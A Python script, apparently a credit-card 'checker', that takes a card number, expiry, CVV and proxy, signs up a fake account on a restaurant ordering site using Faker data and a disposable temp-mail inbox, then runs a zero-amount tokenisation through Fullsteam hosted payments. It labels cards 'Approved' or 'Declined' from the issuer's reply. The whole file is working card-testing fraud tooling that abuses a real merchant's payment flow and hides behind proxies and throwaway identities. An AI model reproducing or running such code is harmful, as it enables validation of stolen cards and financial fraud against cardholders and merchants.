from faker import Faker
from httpx import AsyncClient
import asyncio
async def fullsteampay(cc,mes,ano,cvv,proxyg):
    async with AsyncClient(proxies=proxyg,verify=False) as web:
        fake = Faker('en_US')

        name = fake.first_name()
        zipcode = fake.zipcode()
        phone = fake.phone_number().replace('-','').replace('.','').replace('(','').replace(')','')[:10]

        gg = await web.post('https://api.internal.temp-mail.io/api/v3/email/new')
        rg = gg.json()
        email = rg['email']

        headers = {
            'accept': 'application/json',
            'accept-language': 'es-419,es;q=0.6',
            'content-type': 'application/json; charset=utf-8',
            'origin': 'https://georgiadeliverstakeout.com',
            'priority': 'u=1, i',
            'referer': 'https://georgiadeliverstakeout.com/',
            'sec-ch-ua': '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'z-client-app': 'web5-portal-606cc807',
            'z-client-channel': 'http://api.zuppler.com/v3/channels/606cc807.json',
        }

        json_data = {
            'operationName': 'GetMenuItem',
            'query': 'query GetMenuItem($item_id: Int!, $restaurant_id: Int!, $channel_id: String, $integration_remote_id: String) { item(itemId: $item_id, channelId: $channel_id, integrationRemoteId: $integration_remote_id, restaurantId: $restaurant_id) {\n  id\n  name\n  alias\n  description\n  dietaryPreferences\n  minCalories\n  maxCalories\n  availability {\n    custom\n    days\n    services\n    time {\n      close\n      open\n    }\n  }\n  image {\n    active\n    original\n    xlarge\n    tiny\n  }\n  sizes {\n    id\n    size_id\n    size_name\n    active\n    coupon\n    min_qty\n    price\n    markupForPrice\n    priority\n    serving_label\n    serving_qty\n    modifiers {\n      id\n      active\n      name\n      description\n      allow_grouping\n      max_selections\n      min_selections\n      multiple_modifiers\n      multiple_selections\n      priority\n      depends_on\n      master_modifier_id\n      options {\n        id\n        active\n        dish_id\n        name\n        price\n        markupForPrice\n        default\n        description\n        group\n        group_label\n        priority\n        weight\n        image {\n          active\n          medium\n          thumb\n        }\n      }\n    }\n  }\n} }',
            'variables': '{"item_id":7603381,"restaurant_id":27636,"channel_id":"606cc807","integration_remote_id":"3408f7f7"}',
        }

        response = await web.post('https://restaurants-api5.zuppler.com/graphql', headers=headers, json=json_data)
        r1 = response.text

        json_data = {
            'operationName': 'GetPauseOnlineOrdering',
            'query': 'query GetPauseOnlineOrdering($restaurant_id: Int!) { restaurant(id: $restaurant_id) {\n  settings {\n    pause_online_ordering\n  }\n} }',
            'variables': '{"restaurant_id":27636}',
        }

        response = await web.post('https://restaurants-api5.zuppler.com/graphql', headers=headers, json=json_data)
        r2 = response.text

        headers = {
            'accept': '*/*',
            'accept-language': 'es-419,es;q=0.6',
            'origin': 'https://georgiadeliverstakeout.com',
            'priority': 'u=1, i',
            'referer': 'https://georgiadeliverstakeout.com/',
            'sec-ch-ua': '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        json_data = {
            'channel_id': 3743,
            'name': name,
            'email': email,
            'phone': phone,
            'password': 'wsrtwsEWRFT33',
            'type': 'email',
        }

        response = await web.post('https://accounts-api5.zuppler.com/v5/accounts', headers=headers, json=json_data)
        r3 = response.text

        ide = r3.split('{"id":')[1].split(',')[0]
        
        await asyncio.sleep(5)
        
        response = await web.get(f'https://api.internal.temp-mail.io/api/v3/email/{email}/messages')
        r4 = response.text

        code = r4.split('complete registration.')[1].split('Thank')[0]
        code = code.replace('\\n', '')

        json_data = {
            'id':ide,
            'token': code,
            'channel_id': '3743',
            'restaurant_id': '27636',
        }

        response = await web.post('https://accounts-api5.zuppler.com/v5/accounts/confirm', headers=headers, json=json_data)
        r5 = response.text

        headers = {
            'accept': 'application/json',
            'accept-language': 'es-419,es;q=0.6',
            'content-type': 'application/json; charset=utf-8',
            'origin': 'https://georgiadeliverstakeout.com',
            'priority': 'u=1, i',
            'referer': 'https://georgiadeliverstakeout.com/',
            'sec-ch-ua': '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'z-client-app': 'web5-portal-606cc807',
            'z-client-channel': 'http://api.zuppler.com/v3/channels/606cc807.json',
        }

        json_data = {
            'action': 'login',
            'payload': {
                'username': email,
                'password': 'wsrtwsEWRFT33',
            },
        }

        response = await web.post('https://carts-api.zuppler.com/v5/customers/1919a6e8-75f9-4aae-b6d3-b59bf497b452', headers=headers, json=json_data)
        r6 = response.text

        json_data = {
            'customer_id': '1919a6e8-75f9-4aae-b6d3-b59bf497b452',
            'order_id': 'a41735d7-d944-4a1f-9dc6-b3b37d90bf21',
        }

        response = await web.post('https://payments-api.zuppler.com/v5/payments/tenders/61165/init', headers=headers, json=json_data)
        r7 = response.text

        autentkey = r7.split('"authentication_key":"')[1].split('"')[0]

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'es-419,es;q=0.6',
            'priority': 'u=0, i',
            'referer': 'https://georgiadeliverstakeout.com/',
            'sec-ch-ua': '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'iframe',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'cross-site',
            'sec-fetch-user': '?1',
            'sec-gpc': '1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        }

        params = {
            'operationType': 'Token',
            'cardEntryContext': 'WebConsumerInitiated',
            'languagePreferenceTag': 'en-US',
        }

        response = await web.get(f'https://hostedpayments.fullsteampay.net/hostedcontrols/cvv/{autentkey}', params=params, headers=headers)
        r8 = response.text

        token = r8.split('name="__RequestVerificationToken" type="hidden" value="')[1].split('"')[0]

        headers = {
            'accept': '*/*',
            'accept-language': 'es-419,es;q=0.6',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://hostedpayments.fullsteampay.net',
            'priority': 'u=1, i',
            'referer': 'https://hostedpayments.fullsteampay.net/',
            'sec-ch-ua': '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            '__RequestVerificationToken': token,
            'AuthenticationKey': autentkey,
            'CardEntryContext': 'WebConsumerInitiated',
            'CustomerId': '',
            'CardNumber': cc,
            'ExpirationMonth': f'{int(mes)}',
            'ExpirationYear': ano,
            'NameOnAccount': name,
            'Zip': zipcode,
            'LanguagePreferenceTag': 'en-US',
            'LanguagePreferenceRule': 'Default',
        }

        response = await web.post('https://hostedpayments.fullsteampay.net/hostedcontrols/CardDetails', headers=headers, data=data)
        r9 = response.text

        token2 = r9.split('{"token":"')[1].split('"')[0]

        headers = {
            'accept': '*/*',
            'accept-language': 'es-419,es;q=0.6',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://hostedpayments.fullsteampay.net',
            'priority': 'u=1, i',
            'referer': 'https://hostedpayments.fullsteampay.net/',
            'sec-ch-ua': '"Brave";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            '__RequestVerificationToken': token,
            'AuthenticationKey': autentkey,
            'CVV': cvv,
            'PaymentAmount': '0',
            'TaxAmount': '0',
            'IncludeTokenInResponse': 'false',
            'DisableDuplicateDetection': 'False',
            'CardEntryContext': 'WebConsumerInitiated',
            'CustomerId': '',
            'InvoiceNumber': '',
            'FingerprintSessionId': '',
            'LanguagePreferenceTag': 'en-US',
            'LanguagePreferenceRule': 'Default',
            'Token': token2,
        }

        response = await web.post('https://hostedpayments.fullsteampay.net/hostedcontrols/CardToken', headers=headers, data=data)
        r9 = response.text
        print(r9)

        if 'No reason to decline' in r9:
            status = 'Approved ✅'
            mensaje = '(85) No reason to decline'
            avs = None
            cvv_r = None
        else:
            respcode = r9.split('"issuerResponseCode":"')[1].split('"')[0].strip()
            mensaje = r9.split('"issuerResponseDescription":"')[1].split('"')[0].strip()
            try:    
                avs = r9.split('"avsResponseCode":"')[1].split('"')[0].strip()
            except:
                avs = 'Unavailable'
            try:
                cvv_r = r9.split('"cvvResponseCode":"')[1].split('"')[0].strip()
            except:
                cvv_r = 'Unavailable'
            
            if 'Insufficient Funds' in mensaje:
                status = 'Approved ✅'
            elif "Approved" in mensaje:
                status = 'Approved ✅'
            elif "CVV2 Value Mismatch" in mensaje:
                status = 'Approved ✅'
            else:
                status = 'Declined ❌'

            mensaje = f"({respcode}) {mensaje}"
        return status, mensaje, avs, cvv_r